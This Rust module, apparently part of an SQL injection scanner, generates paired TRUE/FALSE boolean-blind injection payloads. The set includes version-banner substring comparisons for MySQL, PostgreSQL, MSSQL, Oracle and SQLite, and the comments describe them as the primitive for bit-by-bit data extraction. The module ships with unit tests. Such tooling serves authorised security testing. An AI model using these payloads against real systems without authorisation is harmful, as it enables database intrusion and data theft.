//! Boolean-based blind SQL injection generators.
//!
//! Every probe is emitted as a **TRUE/FALSE pair**: the `-true` variant keeps
//! the original result set (page looks like the baseline), the `-false`
//! variant suppresses it (page diverges). A confirmed injection is a pair
//! where TRUE matches the baseline and FALSE does not — coincidental
//! divergence on a single request is not enough.
//!
//! These are deliberately *not* `OR 1=1` tautologies. The predicates are
//! extraction-grade: DBMS-specific `ASCII(SUBSTRING(version,1,1))` comparisons
//! that both prove injectability and demonstrate the exact primitive used to
//! read data one bit at a time, plus dialect-neutral `EXISTS`/subquery
//! predicates for engines whose banner function is filtered.

use super::GeneratedPayload;
use crate::clause_map::SqlClause;
use crate::detection::DbmsFamily;
use crate::types::ProbeType;

fn pair(
    stem: &str,
    true_expr: &str,
    false_expr: &str,
    dbms: Option<DbmsFamily>,
    clause: SqlClause,
) -> Vec<GeneratedPayload> {
    let mk = |suffix: &str, expr: &str| GeneratedPayload {
        name: format!("bool-{stem}-{suffix}"),
        probe_type: ProbeType::BooleanBlind,
        payload_str: format!("' AND {expr}-- -"),
        expected_dbms: dbms,
        clause: Some(clause),
    };
    vec![mk("true", true_expr), mk("false", false_expr)]
}

pub fn generate() -> Vec<GeneratedPayload> {
    use DbmsFamily::*;
    use SqlClause::{CaseWhen, Subquery, Substring};
    let mut out = Vec::new();

    // --- Dialect-neutral injectability, no numeric tautology ----------------
    // EXISTS over a constant subquery: TRUE returns the row, FALSE drops it.
    out.extend(pair("exists", "EXISTS(SELECT 1)", "NOT EXISTS(SELECT 1)", None, Subquery));
    // Correlated string comparison — survives filters that only match digits.
    out.extend(pair("strcmp", "(SELECT 'a')<(SELECT 'b')", "(SELECT 'b')<(SELECT 'a')", None, Subquery));
    // Error-forcing CASE: FALSE branch divides by zero, a strong differential
    // even when the page body is otherwise static.
    out.extend(pair(
        "case-div",
        "(SELECT CASE WHEN (1<2) THEN 1 ELSE 1/(SELECT 0) END)=1",
        "(SELECT CASE WHEN (2<1) THEN 1 ELSE 1/(SELECT 0) END)=1",
        None,
        CaseWhen,
    ));

    // --- Extraction-grade banner comparisons (one bit at a time) ------------
    // ASCII of the first banner char > 52 is TRUE for every real backend; the
    // > 200 form is FALSE. The comparison operand is what a real extraction
    // loop would binary-search.
    out.extend(pair(
        "mysql-substr",
        "ASCII(SUBSTRING((SELECT version()),1,1))>52",
        "ASCII(SUBSTRING((SELECT version()),1,1))>200",
        Some(MySQL),
        Substring,
    ));
    out.extend(pair(
        "pg-substr",
        "ASCII(SUBSTR((SELECT version()),1,1))>52",
        "ASCII(SUBSTR((SELECT version()),1,1))>200",
        Some(PostgreSQL),
        Substring,
    ));
    out.extend(pair(
        "mssql-substr",
        "UNICODE(SUBSTRING((SELECT @@version),1,1))>52",
        "UNICODE(SUBSTRING((SELECT @@version),1,1))>200",
        Some(MSSQL),
        Substring,
    ));
    out.extend(pair(
        "oracle-substr",
        "ASCII(SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1))>52",
        "ASCII(SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1))>200",
        Some(Oracle),
        Substring,
    ));
    out.extend(pair(
        "sqlite-substr",
        "UNICODE(SUBSTR((SELECT sqlite_version()),1,1))>52",
        "UNICODE(SUBSTR((SELECT sqlite_version()),1,1))>200",
        Some(SQLite),
        Substring,
    ));

    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_probe_has_a_matched_pair() {
        let payloads = generate();
        assert!(!payloads.is_empty(), "boolean generator must not be empty");
        let trues = payloads.iter().filter(|p| p.name.ends_with("-true")).count();
        let falses = payloads.iter().filter(|p| p.name.ends_with("-false")).count();
        assert_eq!(trues, falses, "TRUE/FALSE variants must be balanced");
    }

    #[test]
    fn no_or_tautology() {
        for p in generate() {
            let s = p.payload_str.replace(' ', "").to_lowercase();
            assert!(!s.contains("or1=1"), "trivial OR tautology in: {}", p.payload_str);
            assert!(!s.contains("'or'"), "trivial OR-string tautology in: {}", p.payload_str);
        }
    }

    #[test]
    fn all_boolean_blind() {
        assert!(generate().iter().all(|p| p.probe_type == ProbeType::BooleanBlind));
    }

    #[test]
    fn true_and_false_expressions_differ() {
        let payloads = generate();
        // Pair up by stem and ensure the two payload strings are not identical.
        for t in payloads.iter().filter(|p| p.name.ends_with("-true")) {
            let stem = t.name.trim_end_matches("-true");
            let f = payloads
                .iter()
                .find(|p| p.name == format!("{stem}-false"))
                .expect("missing false variant");
            assert_ne!(t.payload_str, f.payload_str, "pair {stem} has identical variants");
        }
    }
}

